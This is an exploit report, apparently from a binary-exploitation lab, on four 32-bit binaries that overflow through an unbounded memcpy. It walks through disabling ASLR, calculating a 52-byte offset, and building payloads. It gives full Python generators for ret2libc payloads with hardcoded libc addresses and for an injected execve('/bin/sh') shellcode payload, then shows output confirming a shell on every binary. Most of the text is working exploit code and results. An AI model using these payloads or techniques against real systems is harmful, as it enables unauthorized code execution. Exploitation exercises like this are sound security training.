# Tasos Binaries: Exploit Report & Methodology

This document summarizes the methodology and exact parameters used to successfully exploit all 4 binaries located within the `tasos` folder (`bin.1`, `bin.2`, `bin.3`, `bin.4`). Full shell execution (`uid=1000`) was achieved on the first attempt by adhering to the established execution constraints.

## 1. The Core Environment Rule
Before analyzing or running any payload, it was necessary to enforce a static, deterministic memory layout. All scripts and dynamic analyses were executed under this wrapper:
```bash
env -i TEMP=1000 setarch i686 -R --3gb ./binary [payload]
```
This disables ASLR and provides a consistent heap seed via `TEMP`.

---

## 2. Methodology & Reconnaissance

The binaries in `tasos` follow the same template as the `regina` and `regina 2` sets. The core vulnerability is an unbounded `memcpy` inside `display_file`.

### Reconnaissance Results
Using `readelf -l ./binary | grep GNU_STACK`:
*   **bin.1**: `GNU_STACK RW` (NX Bit is ON) → Proceed with Ret2libc
*   **bin.2**: `GNU_STACK RWE` (NX Bit is OFF) → Proceed with Shellcode Injection
*   **bin.3**: `GNU_STACK RW` (NX Bit is ON) → Proceed with Ret2libc
*   **bin.4**: `GNU_STACK RW` (NX Bit is ON) → Proceed with Ret2libc

### Offset Calculation
From `objdump -d bin.1` inside `display_file`:
```asm
lea -0x30(%ebp), %eax    ← buffer start
...
call memcpy@plt           ← at 0x80487ff, instruction after = 0x8048804
```
`0x30` = 48 decimal. 48 bytes (buffer) + 4 bytes (saved EBP) = **52 bytes** offset.

---

## 3. Exploit Payload Generation

### Category A: Ret2libc Payload (`bin.1`, `bin.3`, `bin.4`)
*   `system()` Address: `0xb7dd58e0`
*   `"/bin/sh"` Address: `0xb7f42de8`

**Payload Structure (64 bytes total)**:
`[52 A's padding]` + `[system addr]` + `[0xdeadbeef fake ret]` + `[/bin/sh addr]`

```python
import struct
def p32(v): return struct.pack('<I', v)
payload = b'A'*52 + p32(0xb7dd58e0) + p32(0xdeadbeef) + p32(0xb7f42de8)
with open('exploit.X','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

### Category B: Shellcode Payload (`bin.2`)
GDB batch breakpoint at `0x8048804` (instruction after `memcpy`), ran `p/x $ebp - 0x30`:

```
ebp = 0xbfffe308
buf_addr = 0xbfffe308 - 0x30 = 0xbfffe2d8
```

**Payload Structure (56 bytes total)**:
`[23-byte shellcode]` + `[29 A's padding]` + `[0xbfffe2d8 return addr]`

```python
import struct
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I', 0xbfffe2d8)
with open('exploit.2','wb') as f: f.write(str(len(payload)).encode() + b' ' + payload)
```

---

## 4. Verification

```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
```

**Results:**
*   `=== BIN 1 ===` `uid=1000(andre) gid=1000(andre) ...` → **SUCCESS**
*   `=== BIN 2 ===` `uid=1000(andre) gid=1000(andre) ...` → **SUCCESS**
*   `=== BIN 3 ===` `uid=1000(andre) gid=1000(andre) ...` → **SUCCESS**
*   `=== BIN 4 ===` `uid=1000(andre) gid=1000(andre) ...` → **SUCCESS**

---

## 5. Notes

- The `tasos` binaries use Linux 2.6.32 (vs 3.2.0 for regina sets) but this makes no practical difference to the exploit methodology.
- bin.2 buffer address (`0xbfffe2d8`) matches regina 2 exactly.
- No mmap/gadget-building logic in any `main()` — pure ret2libc / shellcode, no ROP needed.
